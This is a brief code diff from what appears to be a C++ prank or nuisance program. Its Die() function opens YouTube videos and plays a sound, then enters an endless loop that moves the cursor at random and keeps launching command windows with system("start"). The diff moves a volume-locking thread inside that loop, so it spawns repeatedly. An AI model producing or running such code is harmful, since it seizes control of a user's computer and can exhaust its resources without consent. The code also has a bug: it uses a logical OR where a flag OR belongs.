@@ -54,11 +54,10 @@ void Die() {
         ShellExecute(0, 0, L"https://www.youtube.com/watch?v=KE1ynBZ-9Bw", 0, 0, SW_SHOWNORMAL);
     }
     ShellExecute(0, 0, L"https://www.youtube.com/watch?v=ZHmROm_CRH4", 0, 0, SW_SHOWNORMAL);
-    std::thread first (LockVolume);
     PlaySound(TEXT("music.wav"), NULL, SND_FILENAME || SND_ASYNC);
     while (true) {
 
-
+        std::thread first (LockVolume);
         // Opens lots of videos
         SetCursorPos(rand() % 1000, rand() % 800);
         system("start");
